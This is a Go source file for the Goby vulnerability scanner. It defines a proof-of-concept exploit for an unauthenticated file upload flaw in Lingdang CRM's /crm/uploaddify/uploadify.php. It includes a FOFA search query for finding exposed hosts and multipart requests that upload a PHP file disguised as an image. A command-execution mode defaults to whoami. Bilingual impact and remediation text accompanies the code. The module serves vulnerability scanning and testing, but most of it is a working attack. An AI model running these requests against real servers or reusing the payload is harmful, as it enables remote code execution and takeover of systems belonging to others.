package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Lingdang CRM /crm/uploaddify/uploadify.php File Upload Vulnerability",
    "Description": "<p>Lingdang CRM /crm/uploaddify/uploadify.php has a file upload vulnerability. The file upload vulnerability occurs in the function of the application that allows users to upload files. If the upload function fails to properly verify and limit the type and content of the uploaded file, an attacker may exploit this vulnerability to upload malicious files, such as script files containing executable code, thereby executing arbitrary commands on the server, controlling or destroying the system.</p>",
    "Product": "Lingdang CRM",
    "Homepage": "https://www.ldcrm.com/",
    "DisclosureDate": "2024-12-06",
    "PostTime": "2024-12-12",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\"",
    "GobyQuery": "body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\"",
    "Level": "3",
    "Impact": "<p>1. Execute arbitrary code. Attackers can control the server by uploading malicious code files; </p><p> 2. Data leakage. Attackers may obtain sensitive data by uploading malicious files; </p><p> 3. Service interruption. Attackers may upload malicious files to cause server resource exhaustion or service unavailability;</p>",
    "Recommendation": "<p>1. Strictly limit the types of uploaded files and prohibit the upload of executable files; </p><p> 2. Perform strict security checks on uploaded files, such as virus scanning and content review; </p><p> 3. Use a file whitelist mechanism to only allow known safe file types to be uploaded;</p>",
    "References": [
        "https://stack.chaitin.com/vuldb/detail/0cf940e1-acfb-40c9-910f-5cb146d6d898"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/uploaddify/uploadify.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/png\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH1|lastbody|regex|..\\/(.*?)\\/\\?",
                "FILE_PATH|define|variable|/crm/{{{FILE_PATH1}}}/{{{FILENAME}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/uploaddify/uploadify.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"23333.php\"\r\nContent-Type: image/png\r\n\r\n<?php echo 23333;?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "23333.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "灵当 CRM /crm/uploaddify/uploadify.php 文件上传漏洞",
            "Product": "灵当 CRM",
            "Description": "<p>灵当 CRM /crm/uploaddify/uploadify.php存在文件上传漏洞，文件上传漏洞发生在应用程序允许用户上传文件的功能中，如果上传功能未能正确地验证和限制上传文件的类型和内容，攻击者可能利用此漏洞上传恶意文件，如包含可执行代码的脚本文件，从而在服务器上执行任意命令，控制或破坏系统<br></p>",
            "Recommendation": "<p>1.严格限制上传文件的类型，禁止执行文件的上传；</p><p>2.对上传文件进行严格的安全检查，如病毒扫描和内容审查；</p><p>3.使用文件白名单机制，只允许已知安全的文件类型上传；<br></p>",
            "Impact": "<p>1.执行任意代码，攻击者可以通过上传恶意代码文件来控制服务器；</p><p>2.数据泄露，攻击者可能通过上传恶意文件来获取敏感数据；</p><p>3.服务中断，攻击者可能上传恶意文件导致服务器资源耗尽或服务不可用；<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Lingdang CRM /crm/uploaddify/uploadify.php File Upload Vulnerability",
            "Product": "Lingdang CRM",
            "Description": "<p>Lingdang CRM /crm/uploaddify/uploadify.php has a file upload vulnerability. The file upload vulnerability occurs in the function of the application that allows users to upload files. If the upload function fails to properly verify and limit the type and content of the uploaded file, an attacker may exploit this vulnerability to upload malicious files, such as script files containing executable code, thereby executing arbitrary commands on the server, controlling or destroying the system.<br></p>",
            "Recommendation": "<p>1. Strictly limit the types of uploaded files and prohibit the upload of executable files;&nbsp;</p><p>&nbsp;2. Perform strict security checks on uploaded files, such as virus scanning and content review;&nbsp;</p><p>&nbsp;3. Use a file whitelist mechanism to only allow known safe file types to be uploaded;<br></p>",
            "Impact": "<p>1. Execute arbitrary code. Attackers can control the server by uploading malicious code files;&nbsp;</p><p>&nbsp;2. Data leakage. Attackers may obtain sensitive data by uploading malicious files;&nbsp;</p><p>&nbsp;3. Service interruption. Attackers may upload malicious files to cause server resource exhaustion or service unavailability;<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/crm/uploaddify/uploadify.php"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9977"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}
